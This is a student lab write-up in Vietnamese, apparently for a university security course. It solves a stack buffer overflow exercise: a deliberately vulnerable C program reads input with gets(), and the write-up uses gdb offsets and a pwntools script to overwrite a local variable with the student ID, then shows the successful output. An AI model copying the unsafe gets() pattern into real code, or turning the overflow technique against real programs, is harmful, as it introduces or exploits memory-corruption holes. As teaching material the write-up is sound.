# NT209.L21.ANTN-Bonus-19520982
## Task
```c
# include <stdio.h>
# include<stdlib.h>

int student_id;

void smash_my_buffer()
{
    int var = 0x12345678;
    int another_var = 0x0;

    char buf[20];
    gets(buf);

    if ((var != 0x12345678) || (another_var != 0))
        printf("You changed my local variables.\n");

    if (var == student_id)
           printf("Nice works. You've changed my var to %d. That's what I need :)\n",var);
    else
           printf("Almost there. My var is %d now. Try harder.\n", var);
}

int main(int argc, char *argv[])
{
    if (argc < 2)
    {
        printf("Please provide your Student ID.\nUsage: %s <your id>\n", argv[0]);
        exit(0);
    }

    student_id = atoi(argv[1]);
    smash_my_buffer();
}
```  
> Thay đổi giá trị `var` thành `student_id`.  

## Solution
Debug chương trình bằng `gdb`.  

![image](https://user-images.githubusercontent.com/44528004/121312808-f2422880-c92f-11eb-9a09-5767b314cf8b.png)  

Trong quá trình debug, ta có thấy rằng, biến `var` nằm tại địa chỉ `ebp - 0xc` và biến `another_var` nằm tại địa chỉ `ebp - 0x10`. Đồng thời, biến `buf` nằm tại vị trí `ebp - 0x24`.  

Stack:
```
+---------------------------------+
|           saved ebp             |
+---------------------------------+---> ebp của hàm smash_my_buffer()
                ...
+---------------------------------+
|           0x1234578             |
+---------------------------------+---> ebp - 0xc
|              0x0                |
+---------------------------------+---> ebp - 0x10
                ... ---> 16 bytes
+---------------------------------+
|               buf               |
+---------------------------------+---> ebp - 0x24
```  

Vậy để thay đổi giá trị của biến `var` tại ô nhớ `ebp - 0xc`, chúng ta cần nhập giá trị cho biến `buf` với độ dài `0x1c` (`28`) bytes. Trong đó, `20` bytes đầu để fill hết vùng nhớ của `buf`, 4 bytes tiếp theo để ghi đè biến `another_var` tại ô nhớ `ebp - 0x10`, và 4 bytes cuối cùng là giá trị `student_id`.  

Stack khi bị overflowed.  
```
+---------------------------------+
|           saved ebp             |
+---------------------------------+---> ebp của hàm smash_my_buffer()
                ...
+---------------------------------+
|           0x0129ddd6            |---> 0x0129ddd6 = hex(19520982)
+---------------------------------+---> ebp - 0xc
|             'AAAA'              |
+---------------------------------+---> ebp - 0x10
                ... ---> 16 bytes
+---------------------------------+
|             'AAAA'               |
+---------------------------------+---> ebp - 0x24
```

Viết script exploit:  
```python
#! /bin/python3

from pwn import *

context.binary = './simple-buffer'

io = process(['./simple-buffer', '19520982'])

e = ELF('./simple-buffer')

exploit_payload = b'A' * (0x24 - 0xc) + p32(int('19520982'))
print(exploit_payload)

io.sendline(exploit_payload)
io.interactive()
```  
### Kiểm tra kết quả
```
└─$ python3 solution.py
[*] '/mnt/f/lab 6/simple-buffer'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process './simple-buffer': pid 107
b'AAAAAAAAAAAAAAAAAAAAAAAA\xd6\xdd)\x01'
[*] Switching to interactive mode
[*] Process './simple-buffer' stopped with exit code 0 (pid 107)
You changed my local variables.
Nice works. You've changed my var to 19520982. That's what I need :)
[*] Got EOF while reading in interactive
$
```
> Thành công!
